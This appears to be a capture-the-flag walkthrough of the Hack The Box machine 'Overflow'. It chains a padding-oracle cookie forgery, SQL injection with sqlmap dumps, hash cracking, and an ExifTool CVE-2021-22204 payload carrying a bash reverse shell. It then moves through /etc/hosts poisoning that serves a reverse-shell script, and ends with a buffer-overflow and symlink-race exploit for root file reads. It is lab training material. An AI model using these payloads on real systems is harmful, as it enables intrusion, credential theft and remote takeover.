# Hack The Box: Overflow — Complete Walkthrough

**Target IP:** `10.129.11.189`  
**Attacker IP (Kali):** `10.10.16.84`  
**Difficulty:** Hard  
**OS:** Linux (Ubuntu 18.04)

---

## Table of Contents

1. [Introduction & Mindset](#introduction--mindset)
2. [Step 1: Initial Reconnaissance](#step-1-initial-reconnaissance)
3. [Step 2: Web Enumeration & Cookie Analysis](#step-2-web-enumeration--cookie-analysis)
4. [Step 3: Padding Oracle Attack — Becoming Admin](#step-3-padding-oracle-attack--becoming-admin)
5. [Step 4: SQL Injection in Logs Panel](#step-4-sql-injection-in-logs-panel)
6. [Step 5: Dumping Databases & Cracking Hashes](#step-5-dumping-databases--cracking-hashes)
7. [Step 6: CMS Made Simple & Vhost Discovery](#step-6-cms-made-simple--vhost-discovery)
8. [Step 7: CVE-2021-22204 — ExifTool RCE](#step-7-cve-2021-22204--exiftool-rce)
9. [Step 8: Shell as www-data](#step-8-shell-as-www-data)
10. [Step 9: Lateral Movement to developer](#step-9-lateral-movement-to-developer)
11. [Step 10: Lateral Movement to tester](#step-10-lateral-movement-to-tester)
12. [Step 11: Privilege Escalation to root](#step-11-privilege-escalation-to-root)
13. [Final Flags](#final-flags)
14. [Lessons Learned & Key Takeaways](#lessons-learned--key-takeaways)

---

## Introduction & Mindset

Before touching the target, remember: **every piece of information is a clue.** Hard boxes like Overflow are not about finding one glaring vulnerability — they are about chaining multiple small weaknesses together. The mindset is:

> *"What looks normal but behaves strangely? What can I manipulate? What trusts me more than it should?"*

Overflow teaches:
- **Cryptographic failures** (padding oracles)
- **Injection attacks** (SQLi)
- **Application misconfigurations** (ExifTool RCE)
- **Password reuse** (lateral movement)
- **Race conditions** (TOCTOU privilege escalation)

Each step builds on the last. If you get stuck, re-read every error message, every response header, and every cookie. The box talks to you — you just have to listen.

---

## Step 1: Initial Reconnaissance

### What We Did

```bash
# Add the target to /etc/hosts early — we know HTB machines often use vhosts
echo "10.129.11.189 overflow.htb" | sudo tee -a /etc/hosts

# Full port scan
nmap -p- --min-rate 10000 10.129.11.189

# Service/version detection on discovered ports
nmap -sC -sV -p 22,25,80 10.129.11.189
```

### Output

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Hacker Mindset

**Why add to `/etc/hosts` immediately?**

Many web applications behave differently when accessed via IP vs. via hostname. Virtual hosts (vhosts) are common on HTB. If we only ever visit `http://10.129.11.189`, we might miss entire subdomains or applications that rely on the `Host:` header. Adding `overflow.htb` now saves time later.

**Why scan all ports first?**

If we only scanned top 1000 ports, we might miss non-standard services. `--min-rate 10000` speeds things up. We found SMTP (25) — this tells us the box can send/receive email. Keep that in the back of your mind; it might be useful for phishing or username enumeration later.

**Why note the Apache version?**

Apache 2.4.29 on Ubuntu strongly suggests **Ubuntu 18.04 Bionic**. This helps us estimate what packages, kernels, and vulnerabilities might exist. It sets the "era" of the machine.

---

## Step 2: Web Enumeration & Cookie Analysis

### What We Did

Visited `http://10.129.11.189` (and `http://overflow.htb`) and observed:
- A security company landing page
- Login and Register functionality
- A "Contact Us" form (non-functional)

Registered an account:
```bash
curl -s -c /tmp/ovf_cookies.txt -X POST http://10.129.11.189/register.php \
  -d "username=testuser&password=testpass&password2=testpass" -L
```

Observed the `auth` cookie:
```
auth=8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI
```

### Hacker Mindset

**Why register an account?**

Because authenticated attack surface is always larger than unauthenticated. Many vulnerabilities (IDOR, privilege escalation, additional endpoints) only appear after login. Also, the registration process itself might leak information.

**Why analyze the cookie?**

The cookie is our session identifier. If we can understand how it's generated, we might be able to forge it, decrypt it, or predict it. Let's look at the clues:

1. **Length changes with username length** — this means the username is *inside* the cookie.
2. **Length jumps in multiples of 8** — this is the hallmark of a **block cipher** (likely DES, 3DES, or Blowfish with 8-byte blocks).
3. **Cookie is different every login** — this suggests an **Initialization Vector (IV)** is being used.

We hypothesize the structure: `IV (8 bytes) + plaintext + padding`. The plaintext is likely something like `user=testuser`.

**Why does this matter?**

If the encryption uses CBC mode and the application leaks padding information, we have a **Padding Oracle Attack**. This allows us to decrypt the cookie without knowing the key, and even forge new cookies.

---

## Step 3: Padding Oracle Attack — Becoming Admin

### What We Did

We modified the cookie (removed the last character) and observed the response:
```
<span class=error>Unable to Verify cookie! Invalid padding. Please login Again</span>
```

**"Invalid padding" is the smoking gun.** The application tells us when padding is wrong. This is a classic padding oracle.

We used **PadBuster** to automate the attack:

```bash
# Step 1: Decrypt the cookie
padbuster http://10.129.11.189/home/index.php \
  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
  -cookie auth=8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI
```

When prompted for the error condition, we selected the response that indicated failure (the `302` redirect to `../logout.php?err=1`), which was ID **2**.

**Decrypted value:** `user=testuser`

Then we encrypted a new cookie with `user=admin`:
```bash
padbuster http://10.129.11.189/home/index.php \
  8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI 8 \
  -cookie auth=8phnBfSiM4L0SDWBTyZtSTSRxhdPFFqI \
  -plaintext user=admin
```

**New encrypted cookie:** `BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA`

We replaced our browser cookie with this value and refreshed. Boom — **Admin Panel** link appeared.

### Hacker Mindset

**What is a Padding Oracle?**

In CBC mode block ciphers, plaintext is padded to fill the final block. When decrypting, if the padding is invalid, the application should ideally return a generic error. But if it returns a *different* error (or behavior) for invalid padding vs. invalid data, we can exploit this.

By systematically modifying bytes in the ciphertext and observing the response, we can:
1. **Decrypt** the original plaintext byte-by-byte
2. **Encrypt** arbitrary plaintext by chaining blocks together

**Why target `user=admin`?**

The decrypted cookie revealed the format: `user=<username>`. If we can forge `user=admin`, we inherit administrative privileges without ever knowing the encryption key. This is the power of a padding oracle — it bypasses authentication entirely.

**Why use PadBuster instead of doing it manually?**

A manual padding oracle requires hundreds of requests per byte. For a 2-block cookie, that's ~256 × 16 = 4,096 requests. PadBuster automates the response analysis and brute-forcing. Always use the right tool for the job.

---

## Step 4: SQL Injection in Logs Panel

### What We Did

As admin, we noticed a request in the browser's Network tab:
```
GET http://overflow.htb/home/logs.php?name=admin
```

Accessing it returned login timestamps:
```html
<div id='last'>Last login : 10:00:00</div><br>
```

We tested for SQL injection:
```bash
# Normal request
curl -s -b "auth=ADMIN_COOKIE" "http://overflow.htb/home/logs.php?name=admin"

# Injection test — returns more results
curl -s -b "auth=ADMIN_COOKIE" \
  "http://overflow.htb/home/logs.php?name=admin')%20or%201=1%20--%20-"
```

The `OR 1=1` payload returned **all** login records, confirming SQL injection.

We then used **sqlmap** to automate exploitation:

```bash
sqlmap -u "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" \
  --batch --dbs
```

### Hacker Mindset

**Why look at the Network tab?**

When you gain a new privilege level (admin), the frontend may hide features but the browser still fetches data. The Network tab reveals requests that aren't obvious in the UI. Here, the "Logs" popup was broken, but the underlying API call (`logs.php?name=admin`) was functional.

**Why test `admin'` and `admin')`?**

SQL injection comes in many flavors. The query might be:
```sql
SELECT login_times FROM logins WHERE username = 'admin'
```

Or it might be:
```sql
SELECT login_times FROM logins WHERE username = ('admin')
```

If the query uses parentheses, a simple `admin'--` won't work because the closing parenthesis is unmatched. We had to use `admin')--` to balance the syntax. This is why we test multiple payloads systematically.

**Why use sqlmap after manual confirmation?**

Manual SQLi is fine for proof-of-concept, but dumping entire databases by hand is tedious. Sqlmap handles database fingerprinting, table enumeration, and data extraction automatically. Always confirm the injection manually first (to save time if sqlmap fails), then let the tool do the heavy lifting.

---

## Step 5: Dumping Databases & Cracking Hashes

### What We Did

Sqlmap revealed 4 databases. We focused on `cmsmsdb` (CMS Made Simple):

```bash
# Dump CMS users table
sqlmap -u "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" \
  -D cmsmsdb -T cms_users --dump

# Dump siteprefs table (contains salt)
sqlmap -u "http://overflow.htb/home/logs.php?name=admin" \
  --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" \
  -D cmsmsdb -T cms_siteprefs --dump
```

**Results:**
- `admin` hash: `c6c6b9310e0e6f3eb3ffeb2baff12fdd`
- `editor` hash: `e3d748d58b58657bfa4dffe2def0b1c7`
- **Sitemask (salt):** `6c2d17f37e226486`

We researched CMS Made Simple's password algorithm and discovered it uses:
```
md5(sitemask + password)
```

We created a hashcat-compatible file and cracked it:
```bash
cat > hashes.txt << 'EOF'
c6c6b9310e0e6f3eb3ffeb2baff12fdd:6c2d17f37e226486
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486
EOF

hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `editor` password = `alpha!@#$%bravo`

### Hacker Mindset

**Why couldn't we crack the hash with standard MD5?**

Because CMS Made Simple uses a **site-wide salt** (`sitemask`) prepended to passwords before hashing. This means:
- Rainbow tables are useless
- Generic MD5 wordlists won't work
- We MUST know the salt to crack the hash

This is why we dumped `cms_siteprefs` — it stores application configuration, including cryptographic salts.

**Why did only `editor` crack?**

The `admin` password was either not in `rockyou.txt` or was stronger. But on HTB, one cracked credential is often enough. The `editor` account had administrative access to the CMS, which was our next target.

**Why research the application's source code?**

When hashes don't crack with standard methods, the application is doing something non-standard. By looking at CMS Made Simple's source (or documentation), we learned the exact hashing formula. This allowed us to construct the proper hashcat attack (`-m 20` = `md5($salt.$pass)`).

---

## Step 6: CMS Made Simple & Vhost Discovery

### What We Did

Logged into CMS Made Simple at:
```
http://overflow.htb/admin_cms_panel/admin/login.php
```

Credentials: `editor` / `alpha!@#$%bravo`

Navigated to **Extensions → User Defined Tags** and found:
> "Make sure you check out devbuild-job.overflow.htb and report any UI related problems to developer, use the editor account to authenticate."

Added the new vhost:
```bash
echo "10.129.11.189 devbuild-job.overflow.htb" | sudo tee -a /etc/hosts
```

Visited `http://devbuild-job.overflow.htb`, logged in with the **same credentials**, and found a resume upload form accepting `.tiff`, `.jpeg`, `.jpg`.

### Hacker Mindset

**Why check Extensions / User Defined Tags?**

CMS extensions and custom tags are often written by administrators and may contain hardcoded credentials, comments, or hints about the infrastructure. Developers leave notes for themselves. In this case, the tag literally told us about a hidden subdomain and which credentials to use.

**Why reuse the same password?**

Password reuse is one of the most common vulnerabilities in real-world environments. If `editor` uses `alpha!@#$%bravo` for the CMS, there's a good chance they use it elsewhere. Always try credential reuse across every service, panel, and subdomain you discover.

**Why does the upload form matter?**

File uploads are high-value targets. If the application processes uploaded files with external tools (like ExifTool for metadata extraction), any vulnerability in those tools becomes a vulnerability in the web application. We need to determine what happens after upload.

---

## Step 7: CVE-2021-22204 — ExifTool RCE

### What We Did

After uploading a test image, we inspected the page source and found:
```html
<!-- In exiftool condition -->
```

This confirmed the server runs **ExifTool** on uploads. The version was **11.92**, which is vulnerable to **CVE-2021-22204**.

We created a malicious DjVu file with embedded Perl code:

```bash
# Install required tool
sudo apt-get install -y djvulibre-bin

# Create payload
cat > exploit << 'EOF'
(metadata
(Copyright "\
" . qx{/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1'} . \
" b ") )
EOF

# Build malicious DjVu
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit

# Rename to .jpg for upload
mv exploit.djvu exploit.jpg
```

Started a listener on Kali:
```bash
nc -lnvp 4444
```

Uploaded `exploit.jpg`. Within seconds, we received a reverse shell.

### Hacker Mindset

**What is CVE-2021-22204?**

ExifTool is a popular Perl library for reading/writing image metadata. In versions before 12.24, it incorrectly evaluated DjVu annotation strings as Perl code. An attacker could embed a malicious DjVu file inside another image format, and when ExifTool processed it, arbitrary Perl (and thus system) commands would execute.

**Why DjVu inside a JPG?**

The upload form only accepts `.jpg`, `.jpeg`, `.tiff`. But ExifTool determines file type by **content**, not extension. A file named `.jpg` containing DjVu metadata is still processed by the DjVu parser. This is a classic case of trusting user input (the filename) while the backend processes content.

**Why use `djvumake`?**

DjVu is a complex format. `djvumake` allows us to construct a minimal DjVu file with an `ANTa` (annotation) chunk containing our Perl payload. The `INFO=0,0` and `BGjp=/dev/null` create just enough structure for ExifTool to recognize and parse it.

**Why a reverse shell and not a direct command?**

A reverse shell gives us interactive access. If we just ran `whoami > /tmp/pwned`, we'd have to find a way to read the output. A reverse shell is a full session we can work with.

---

## Step 8: Shell as www-data

### What We Did

Caught the reverse shell:
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.11.189] 34348
bash: cannot set terminal process group (1209): Inappropriate ioctl for device
bash: no job control in this shell
www-data@overflow:~/devbuild-job/home/profile$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Hacker Mindset

**What do we do first with a new shell?**

1. **Stabilize it** — `script /dev/null -c bash` gives us a TTY
2. **Enumerate** — `id`, `whoami`, `hostname`, `uname -a`
3. **Look for credentials** — Web applications almost always store database credentials in config files. These are gold for lateral movement.

We immediately checked `/var/www/html/config/` and `/var/www/devbuild-job/config/` because web configs are the lowest-hanging fruit for credential harvesting.

---

## Step 9: Lateral Movement to developer

### What We Did

Found database credentials in `/var/www/html/config/db.php`:
```php
$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
```

Same password found in `/var/www/devbuild-job/config/db.php` and `/var/www/html/admin_cms_panel/config.php`.

We used the password to switch users:
```bash
su - developer
# Password: sh@tim@n
```

Confirmed with `id`:
```
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)
```

### Hacker Mindset

**Why does password reuse happen?**

Developers and sysadmins often reuse passwords across services to simplify management. From an attacker's perspective, one compromised credential is a skeleton key. Always check:
- Web config files (`config.php`, `db.php`, `.env`)
- Backup files
- Source code repositories
- Environment variables

**Why note the `network` group?**

The `id` output showed `groups=1001(developer),1002(network)`. Any unexpected group membership is interesting. We immediately asked: *"What files does the `network` group own or have write access to?"* This led us directly to `/etc/hosts`.

---

## Step 10: Lateral Movement to tester

### What We Did

Enumerated files accessible to the `network` group:
```bash
find / -group network -ls 2>/dev/null
```

Found `/etc/hosts` is writable by `network`:
```
-rwxrw-r-- 1 root network 201 Sep 30 06:00 /etc/hosts
```

Discovered `/opt/commontask.sh` (readable via ACL):
```bash
cat /opt/commontask.sh
```
Content:
```bash
#!/bin/bash
bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
```

This script runs every minute and downloads `task.sh` from `taskmanage.overflow.htb`.

We poisoned `/etc/hosts`:
```bash
echo -e "10.10.16.84\ttaskmanage.overflow.htb" >> /etc/hosts
```

On Kali, we hosted a malicious `task.sh`:
```bash
mkdir -p /tmp/overflow && cd /tmp/overflow
cat > task.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/7777 0>&1
EOF
sudo python3 -m http.server 80
```

Started a listener:
```bash
nc -lnvp 7777
```

Within a minute, we caught a shell as `tester`.

### Hacker Mindset

**Why is /etc/hosts powerful?**

`/etc/hosts` is the first place the OS looks for DNS resolution. If we can write to it, we can redirect any domain to any IP. This is a **DNS hijack** at the local level. The cron job trusts `taskmanage.overflow.htb` — we simply told the machine that *we* are that domain.

**Why check ACLs (getfacl)?**

Standard Unix permissions (`ls -la`) only show owner/group/others. But **Access Control Lists (ACLs)** can grant permissions to specific users or groups. `commontask.sh` showed `---` for "others", but `getfacl` revealed `developer` had `r-x` access. Always use `getfacl` when you see a `+` in `ls -la` permissions.

**Why not modify commontask.sh directly?**

Because we only had `r-x` (read + execute), not `w` (write). We couldn't edit the script, but we could control what it *fetched*.

**Why use port 80 for the web server?**

The cron script uses `http://taskmanage.overflow.htb/task.sh` — no port specified means **port 80**. If we served on port 8080, the request would fail. Since we controlled the target's DNS resolution via `/etc/hosts`, we just needed to listen on the port the script expected.

---

## Step 11: Privilege Escalation to root

### What We Did

As `tester`, we found `/opt/file_encrypt/`:
```bash
ls -la /opt/file_encrypt/
```

- `file_encrypt` — **setuid root**, 32-bit ELF
- `README.md` — mentions a PIN feature

Running it:
```bash
/opt/file_encrypt/file_encrypt
```
Output:
```
This is the code 1804289383. Enter the Pin:
```

### Analysis with GDB

```bash
gdb -q /opt/file_encrypt/file_encrypt
(gdb) b main
(gdb) r
(gdb) p encrypt
$1 = {<text variable, no debug info>} 0x5655585b <encrypt>
```

**Key findings from reversing:**
1. `rand()` is never seeded with `srand()`, so it always produces the same sequence
2. The "random" PIN is deterministic: `random = 0x6b8b4567 * 0x59^10 + ...` XORed with the code
3. As a **signed 32-bit integer**, the PIN is: **`-202976456`**
4. After correct PIN, `scanf("%s", user_name)` reads into a **20-byte buffer** with no bounds checking
5. The return address is at offset **44 bytes**
6. The `encrypt` function address is `0x5655585b` (little-endian: `\x5b\x58\x55\x56`)

### The TOCTOU Race Condition

The `encrypt` function does this:
```c
stat(user_infile, &stat_struct);
if (stat_struct.st_uid == 0) {
    fprintf(stderr,"File %s is owned by root\n",user_infile);
    exit(1);
}
sleep(3);  // <-- THE RACE WINDOW
fd_input = fopen(user_infile,"rb");
```

It checks if the file is owned by root, **sleeps 3 seconds**, then opens it. This is a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability.

### Exploit Setup

**Exploit script (`/tmp/sploit.py`):**
```python
#!/usr/bin/env python3
import sys
print("-202976456")
print("A"*44 + "\x5b\x58\x55\x56")
print(sys.argv[1])
print(sys.argv[2])
```

**Race loop (`/tmp/0xdf`):**
```bash
mkdir -p /tmp/0xdf
cd /tmp/0xdf

while :; do 
    rm -f l; 
    ln -sf /root/root.txt l; 
    sleep 3; 
    rm -f l; 
    echo "oops" > l; 
    sleep 3; 
done
```

This loop toggles `l` between:
- A symlink to `/root/root.txt` (3 seconds)
- A regular file containing "oops" (3 seconds)

**Running the exploit:**
```bash
cd /tmp/0xdf
python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
```

We ran this in a retry loop until it succeeded:
```bash
while true; do
    python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
    if [ -f /tmp/0xdf/o ]; then
        echo "SUCCESS!"
        break
    fi
    sleep 0.5
done
```

**Decryption:**
The output file is XOR-encrypted with `0x9b`. We decrypted it:
```bash
python3 -c "print(''.join([chr(0x9b^x) for x in open('/tmp/0xdf/o','rb').read()]))"
```

### Hacker Mindset

**Why does the PIN never change?**

The developer forgot to call `srand()`. Without a seed, `rand()` always starts with seed `1`, producing the same sequence. This is a common C programming mistake. Always ask: *"What happens when randomness isn't random?"*

**Why is the PIN negative?**

`scanf("%i", &user_pin)` reads a **signed integer**. The mathematical result `4091990840` has the high bit set (`0xf3e6d338`), so in two's complement it's `-202976456`. This is a subtle type conversion issue — the programmer expected a positive number but the attacker can input a negative one.

**Why buffer overflow + return to encrypt?**

We can't directly spawn a shell from the overflow because of NX (non-executable stack) and we don't have a libc leak for ROP. But we **can** redirect execution to an existing function: `encrypt`. This is called a **return-to-function** attack. The `encrypt` function gives us arbitrary file read as root (via the setuid bit).

**Why TOCTOU works here:**

The program checks file ownership at time T1, then opens the file at time T2. Between T1 and T2, the filesystem can change. By swapping a regular file for a symlink during the 3-second `sleep()`, we trick the program into opening a file it was explicitly told to reject.

**Why XOR with 0x9b?**

The `encrypt` function XORs every byte with `0x9b`. Since XOR is its own inverse, we decrypt by XORing again with the same key. This is a simple substitution cipher — easily reversible once you know the key.

**Why use an auto-retry loop?**

Race conditions are timing-dependent. Manual execution requires precise coordination. A retry loop automates the guesswork — eventually, the exploit will hit the window where `l` is a regular file during `stat()` and a symlink during `fopen()`.

---

## Final Flags

```
user.txt:  82b44f[redacted]b4138d28
root.txt:  be6a36[redacted]3edf12a0f
```

---

## Lessons Learned & Key Takeaways

### 1. Cryptography Matters
A single padding oracle vulnerability completely bypassed authentication. Encrypting something without integrity checks (MAC/HMAC) is dangerous.

### 2. Defense in Depth
The CMS hashes were salted, but the salt was stored in the same database. Once SQLi gave us the salt, the hashes fell to a simple dictionary attack.

### 3. Supply Chain / Tool Vulnerabilities
CVE-2021-22204 wasn't in the web application itself — it was in **ExifTool**, a dependency. Always investigate what backend tools process user uploads.

### 4. Credential Reuse is Lethal
One password (`sh@tim@n`) moved us from `www-data` → `developer`. Always try harvested credentials everywhere.

### 5. Group Memberships are Privileges
The `network` group seemed innocuous but granted write access to `/etc/hosts`. Always enumerate group memberships and find associated files.

### 6. Race Conditions are Real
The TOCTOU in `file_encrypt` is a classic concurrency bug. Any time you see a check followed by a delay followed by an action, think: *"Can I change the world between the check and the action?"*

### 7. Persistence Pays Off
None of these vulnerabilities were "easy." Each required:
- Careful observation (padding error message)
- Research (CMS hash algorithm, CVE-2021-22204)
- Tool mastery (padbuster, sqlmap, hashcat, gdb)
- Patience (the TOCTOU race required multiple attempts)

The hacker mindset is not about finding one big vulnerability — it's about chaining small weaknesses into total compromise.

---

**Happy Hacking!** 
